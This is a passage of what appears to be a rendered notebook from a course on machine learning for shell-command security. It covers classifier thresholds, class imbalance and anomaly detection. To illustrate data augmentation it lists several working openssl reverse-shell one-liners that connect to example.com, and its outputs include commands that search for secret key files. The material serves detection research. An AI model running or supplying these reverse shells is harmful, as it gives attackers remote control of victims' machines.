+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>0 1 0 0 0 0 0 0 0 0 
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">_</span> <span class="o">=</span> <span class="p">[</span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">x</span><span class="si">:</span><span class="s2">.4f</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">preds</span><span class="p">[</span><span class="mi">200</span><span class="p">:</span><span class="mi">210</span><span class="p">]]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>0.0004 0.4777 0.0001 0.0080 0.0000 0.0000 0.0017 0.0001 0.0000 0.0002 
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">violin_plot_of_threshold</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_true</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">ax</span><span class="p">:</span>
+        <span class="n">_</span><span class="p">,</span> <span class="n">ax</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">subplots</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
+    <span class="n">sns</span><span class="o">.</span><span class="n">boxplot</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">y_true</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="n">preds</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="n">ax</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_xlabel</span><span class="p">(</span><span class="s2">&quot;Ground truth label&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_ylabel</span><span class="p">(</span><span class="s2">&quot;Prediction&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_title</span><span class="p">(</span><span class="s2">&quot;Distribution of predictions&quot;</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
+
+<span class="n">violin_plot_of_threshold</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_test</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<img alt="../../_images/day2-08-Shell-Language-Processing_39_0.png" src="../../_images/day2-08-Shell-Language-Processing_39_0.png" />
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">threshold</span> <span class="o">=</span> <span class="mf">0.2</span>
+<span class="n">match_indexes</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">preds</span> <span class="o">&gt;=</span> <span class="n">threshold</span><span class="p">)</span>
+<span class="n">match_indexes_benign</span> <span class="o">=</span> <span class="p">(</span><span class="n">match_indexes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">y_test</span><span class="p">[</span><span class="n">match_indexes</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">]],)</span>
+<span class="n">X_test_benign_match</span> <span class="o">=</span> <span class="n">X_test</span><span class="p">[</span><span class="n">match_indexes_benign</span><span class="p">]</span>
+<span class="n">X_arr</span> <span class="o">=</span> <span class="n">X</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="o">.</span><span class="n">toarray</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">X_test_benign_match</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> benign commands are above </span><span class="si">{</span><span class="n">threshold</span><span class="si">}</span><span class="s2"> threshold:&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">X_test_benign_match</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]):</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">((</span><span class="n">X_arr</span> <span class="o">==</span> <span class="n">X_test_benign_match</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">axis</span><span class="o">=</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">X</span><span class="p">[</span><span class="s1">&#39;raw&#39;</span><span class="p">][</span><span class="n">index</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>11 benign commands are above 0.2 threshold:
+	 find / -name foo.bar -print 2&gt;/dev/null
+	 find / -type f -name dummy 2&gt;/dev/null
+	 find &quot;$1&quot; -name &quot;?*&quot; | dd bs=$((${#1}+3)) count=1 2&gt;/dev/null
+	 ssh -x remoteServer &quot;cd yourRemoteDir; ./yourRemoteScript.sh &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; &quot;
+	 find ./ -type d -exec rmdir --ignore-fail-on-non-empty {} 2&gt;/dev/null \;
+	 find / -name foo.bar -print 2&gt;/dev/null
+	 THIS=`readlink -f &quot;${BASH_SOURCE[0]}&quot; 2&gt;/dev/null||echo $0`
+	 find /home -size +100000 -ls 2&gt;/dev/null
+	 find / -name &#39;secret.keys&#39; -print 2&gt;/dev/null
+	 find / -type f -name dummy 2&gt;/dev/null
+	 find . -type f -exec grep -i “redeem reward” {} \; -print 2&gt;/dev/null
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="heavy-imbalance-representative-situation-for-security-problems">
+<h1>Heavy Imbalance: representative situation for security problems<a class="headerlink" href="#heavy-imbalance-representative-situation-for-security-problems" title="Permalink to this headline">#</a></h1>
+<p>It is common to have a heavily imbalanced dataset when ML methods are applied to security problem. It is much harder to acquire well generalized distribution of malicious activity in common enterprise infrastucture. On the contrary, benign activity is abundant, and is easy to acquire.</p>
+<p>In such cases predicting <span class="math notranslate nohighlight">\(y==0\)</span>, i.e. “always benign” allows to achieve high accuracy:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">always_benign</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Predicting &#39;always benign&#39; yields </span><span class="si">{</span><span class="n">accuracy_score</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">always_benign</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">% accuracy.&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Predicting &#39;always benign&#39; yields 99.03% accuracy.
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">plot_classes</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">ax</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">subplots</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">bar</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;Benign&quot;</span><span class="p">,</span><span class="s2">&quot;Malicious&quot;</span><span class="p">],</span>
+            <span class="n">height</span><span class="o">=</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">y</span><span class="o">==</span><span class="mi">0</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">y</span><span class="o">==</span><span class="mi">1</span><span class="p">)),</span> 
+            <span class="n">color</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;steelblue&quot;</span><span class="p">,</span> <span class="s2">&quot;orange&quot;</span><span class="p">],</span>
+            <span class="n">width</span><span class="o">=</span><span class="mf">0.6</span><span class="p">)</span>
+
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_xticks</span><span class="p">([</span><span class="s2">&quot;Benign&quot;</span><span class="p">,</span><span class="s2">&quot;Malicious&quot;</span><span class="p">])</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_ylabel</span><span class="p">(</span><span class="s2">&quot;Count&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_title</span><span class="p">(</span><span class="s2">&quot;Counts of benign and malicious samples in dataset&quot;</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_yscale</span><span class="p">(</span><span class="s2">&quot;log&quot;</span><span class="p">)</span>
+
+<span class="n">plot_classes</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<img alt="../../_images/day2-08-Shell-Language-Processing_43_0.png" src="../../_images/day2-08-Shell-Language-Processing_43_0.png" />
+</div>
+</div>
+<p>It is clearly seen that number of malicious samples is too small.</p>
+<p>Statistical intution behind that might be as follows - ML algorithms learn data distribution behind a specific class, and in our case there is too little data for algorithm to infer general patterns behind malicious data. It is like sampling 100 persons out of specific country and describe a citizens based just on this sample of 100 people - obvsiously it will be biased towards characteristics encountered in this group.</p>
+<p>There are several approaches to combat imbalanced data, for instance:</p>
+<ul class="simple">
+<li><p>data augmentation - generating new samples based on domain knowledge</p></li>
+<li><p>data oversampling - balancing class counts by including multiple occurences of minority class</p></li>
+</ul>
+<p>Example of data augmentation is as follows. Consider enrypted reverse shell that utilizes <code class="docutils literal notranslate"><span class="pre">openssl</span></code> we discussed earlier:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">4242</span> <span class="o">&gt;</span> <span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span>
+</pre></div>
+</div>
+<p>We can artificially generate another functional examples of this technique by modifying ambiguous parts and including them into dataset, e.g.:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">FOOBAR</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">FOOBAR</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">4242</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">FOOBAR</span> <span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">FOOBAR</span>
+<span class="n">mkfifo</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">TEST</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">TEST</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">4242</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">TEST</span>
+<span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">443</span> <span class="o">&gt;</span> <span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span>
+<span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">443</span> <span class="o">&gt;</span> <span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span>
+<span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="p">;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">53</span> <span class="o">&gt;</span> <span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">s</span>
+<span class="o">...</span>
+</pre></div>
+</div>
+<p>This is a decent approach that allows to acquire model much more ready for production deployment.</p>
+<p>For the purpose of this exercise, however, we will implement only oversampling - greedy increase of minority class to even class occurences:</p>
+<div class="section" id="supervised-learning-recap">
+<h2>Supervised learning - recap:<a class="headerlink" href="#supervised-learning-recap" title="Permalink to this headline">#</a></h2>
+<ul class="simple">
+<li><p>Do not got for Deep Learning models unless you know <strong>why</strong> you need that. Otherwise, choose other more bulletproof ML algorithms like decision tree based models.</p></li>
+<li><p>Evaluation of ML solution for security needs is not a single question, and for production deployments <strong>detection rate with fixed False Positive threshold</strong> is the best representation.</p></li>
+<li><p>Security problems are often represented by imbalanced data, therefore additional techniques like data oversampling or better <strong>augmentation</strong> are needed.</p></li>
+</ul>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="unsupervised-learning-anomaly-detection">
+<h1>Unsupervised learning: Anomaly Detection<a class="headerlink" href="#unsupervised-learning-anomaly-detection" title="Permalink to this headline">#</a></h1>
+<p>There are wide range of anomaly detection approaches known, each with their pros and cons. Here is a brief visualisation on several algorithms implemented in sklearn, respectively <a class="reference external" href="https://scikit-learn.org/0.20/modules/generated/sklearn.covariance.EllipticEnvelope.html#sklearn.covariance.EllipticEnvelope">EllipticEnvelope</a>, <a class="reference external" href="https://scikit-learn.org/0.20/modules/generated/sklearn.svm.OneClassSVM.html#sklearn.svm.OneClassSVM">OneClassSVM</a>, <a class="reference external" href="https://scikit-learn.org/0.20/modules/generated/sklearn.ensemble.IsolationForest.html#sklearn.ensemble.IsolationForest">IsolationForest</a> and <a class="reference external" href="https://scikit-learn.org/0.20/modules/generated/sklearn.neighbors.LocalOutlierFactor.html#sklearn.neighbors.LocalOutlierFactor">LocalOutlierFactor</a> <a class="reference external" href="https://scikit-learn.org/0.20/auto_examples/plot_anomaly_comparison.html">[source]</a>:</p>
+<a class="reference internal image-reference" href="2022/img/sklearn_ad_comparison.png"><img alt="2022/img/sklearn_ad_comparison.png" src="2022/img/sklearn_ad_comparison.png" style="width: 600px;" /></a>
+<p>We will not dig in describing Isolation Forest details due to time constraints, but intuition behind single run of outlier detection on 2-dimensional data is visualised below, with good explanation behind this <a class="reference external" href="https://quantdare.com/isolation-forest-algorithm/">source</a>:</p>
+<a class="reference internal image-reference" href="2022/img/isolation_forest_outlier_isolation.gif"><img alt="2022/img/isolation_forest_outlier_isolation.gif" src="2022/img/isolation_forest_outlier_isolation.gif" style="width: 600px;" /></a>
+<p>Let’s apply an enseble (multiple estimators trained in parallel for a single decision heuristic) of Isolation Forest on our data:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.ensemble</span> <span class="kn">import</span> <span class="n">IsolationForest</span>
+<span class="kn">from</span> <span class="nn">sklearn.utils</span> <span class="kn">import</span> <span class="n">shuffle</span>
+
+<span class="n">clf</span> <span class="o">=</span> <span class="n">IsolationForest</span><span class="p">(</span><span class="n">n_estimators</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> 
+                        <span class="n">contamination</span><span class="o">=</span><span class="nb">float</span><span class="p">(</span><span class="mf">.05</span><span class="p">),</span>
+                        <span class="n">max_samples</span><span class="o">=</span><span class="s1">&#39;auto&#39;</span><span class="p">,</span>
+                        <span class="n">max_features</span><span class="o">=</span><span class="mf">1.0</span><span class="p">,</span> 
+                        <span class="n">bootstrap</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> 
+                        <span class="n">n_jobs</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span> 
+                        <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">,</span> 
+                        <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">clf</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">shuffle</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">],</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">))</span>
+
+<span class="n">pred</span> <span class="o">=</span> <span class="n">clf</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">])</span>
+<span class="n">outlier_index</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">pred</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<p>Here are anomalies what <code class="docutils literal notranslate"><span class="pre">IsolationForest</span></code> identified:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">X_outliers</span> <span class="o">=</span> <span class="p">[</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">outlier_index</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Total outliers found: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">X_outliers</span><span class="p">))</span>
+<span class="n">X_outliers</span><span class="p">[</span><span class="o">-</span><span class="mi">120</span><span class="p">:</span><span class="o">-</span><span class="mi">110</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Total outliers found:  634
+</pre></div>
+</div>
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;unset `printenv |grep G4 |awk \&#39;BEGIN{FS=&quot;=&quot;;}{printf(&quot;%s &quot;,$1);}\&#39;`&#39;,
+ &quot;unset `env | awk -F= &#39;/^\\w/ {print $1}&#39; | xargs`&quot;,
+ &#39;gzip -cd path/to/test/file.gz | awk \&#39;BEGIN{global=1}/my regex/{count+=1;print $0 &gt;&quot;part&quot;global&quot;.txt&quot;;if (count==1000000){count=0;global+=1}}\&#39;&#39;,
+ &#39;gzip -dc input1.vcf.gz input2.vcf.gz | awk \&#39;FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 &quot;;&quot; array[$1,$2] }\&#39;&#39;,
+ &quot;diff -r dir1 dir2 | grep &#39;Only in&#39; | grep dir1 | awk &#39;{print $4}&#39; &gt; difference1.txt&quot;,
+ &quot;diff -r dir1 dir2 | grep dir1 | awk &#39;{print $4}&#39; &gt; difference1.txt&quot;,
+ &quot;tac error.log | awk &#39;{if(/2012/)print;else exit}&#39;&quot;,
+ &#39;find . -name &quot;*jpg&quot; -exec du -k {} \\; | awk \&#39;{ total += $1 } END { print total/1024 &quot; Mb total&quot; }\&#39;&#39;,
+ &#39;screen -list | awk \&#39;{print $1}\&#39; | grep -q &quot;$1$&quot;&#39;,
+ &quot;find . -type f -exec wc -l {} \\; | awk &#39;{total += $1} END{print total}&#39;&quot;]
+</pre></div>
+</div>
+</div>
+</div>
+<p>Before jumping to conlcusions about results of this anomaly detection round, let’s try to visualize anomalies. We have one problem - our data has 500 dimensions…</p>
+<div class="section" id="dimensionality-reduction">
+<h2>Dimensionality reduction<a class="headerlink" href="#dimensionality-reduction" title="Permalink to this headline">#</a></h2>
+<p>We can apply dimensionality reduction techniques to visualise anomalies.</p>
+<p>For example, here is visual intuition on how to apply dimensionality reduction from 2 dimensions to 1 dimension <a class="reference external" href="https://ethen8181.github.io/machine-learning/">[Source]</a>:</p>
+<a class="reference internal image-reference" href="2022/img/pca2.png"><img alt="2022/img/pca2.png" src="2022/img/pca2.png" style="width: 700px;" /></a>
+<p>We need a specific logic to define line in 2 dimensions to maximize variance and minimize residuals (i.e. error). In the case above it is a Principal Component Analysis (PCA). We, however, will use <a class="reference external" href="https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.TruncatedSVD.html">TruncatedSVD</a>, since we cannot apply PCA directly on sparse matrices, and we do not have 2D <span class="math notranslate nohighlight">\(\rightarrow\)</span> 1D, but 500D <span class="math notranslate nohighlight">\(\rightarrow\)</span> 3D, so our reduction is mostly cosmetic:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.decomposition</span> <span class="kn">import</span> <span class="n">TruncatedSVD</span>
+<span class="kn">from</span> <span class="nn">sklearn.preprocessing</span> <span class="kn">import</span> <span class="n">StandardScaler</span>
+
+<span class="k">def</span> <span class="nf">reduce</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">n_components</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
+    <span class="c1">#normalize the metrics</span>
+    <span class="n">scaler</span> <span class="o">=</span> <span class="n">StandardScaler</span><span class="p">(</span><span class="n">with_mean</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">X_scaled</span> <span class="o">=</span> <span class="n">scaler</span><span class="o">.</span><span class="n">fit_transform</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
+
+    <span class="c1"># reduce the dimensionality</span>
+    <span class="n">dim_reduction</span> <span class="o">=</span> <span class="n">TruncatedSVD</span><span class="p">(</span><span class="n">n_components</span><span class="o">=</span><span class="n">n_components</span><span class="p">,</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">)</span>
+    <span class="n">X_reduced</span> <span class="o">=</span> <span class="n">dim_reduction</span><span class="o">.</span><span class="n">fit_transform</span><span class="p">(</span><span class="n">X_scaled</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">X_reduced</span>
+
+<span class="k">def</span> <span class="nf">plot_3d_anomalies</span><span class="p">(</span><span class="n">X_reduced</span><span class="p">,</span> <span class="n">outlier_index</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">fig</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">))</span>
+    <span class="n">ax</span> <span class="o">=</span> <span class="n">fig</span><span class="o">.</span><span class="n">add_subplot</span><span class="p">(</span><span class="mi">111</span><span class="p">,</span> <span class="n">projection</span><span class="o">=</span><span class="s1">&#39;3d&#39;</span><span class="p">)</span>
+
+    <span class="c1"># Plot the compressed data points</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">scatter</span><span class="p">(</span><span class="n">X_reduced</span><span class="p">[:,</span> <span class="mi">0</span><span class="p">],</span> <span class="n">X_reduced</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">],</span> <span class="n">zs</span><span class="o">=</span><span class="n">X_reduced</span><span class="p">[:,</span> <span class="mi">2</span><span class="p">],</span> 
+                <span class="n">s</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">lw</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="s2">&quot;inliers&quot;</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="s2">&quot;green&quot;</span><span class="p">)</span>
+    <span class="c1"># Plot x&#39;s for the ground truth outliers</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">scatter</span><span class="p">(</span><span class="n">X_reduced</span><span class="p">[</span><span class="n">outlier_index</span><span class="p">,</span><span class="mi">0</span><span class="p">],</span> <span class="n">X_reduced</span><span class="p">[</span><span class="n">outlier_index</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span> <span class="n">X_reduced</span><span class="p">[</span><span class="n">outlier_index</span><span class="p">,</span><span class="mi">2</span><span class="p">],</span>
+                <span class="n">s</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span> <span class="n">lw</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">marker</span><span class="o">=</span><span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="s2">&quot;red&quot;</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="s2">&quot;outliers&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">legend</span><span class="p">()</span>
+    
+
+<span class="n">reduced</span> <span class="o">=</span> <span class="n">reduce</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">])</span>
+<span class="c1">#reduced = reduce(X[&quot;HashingVectorizer WPT&quot;])</span>
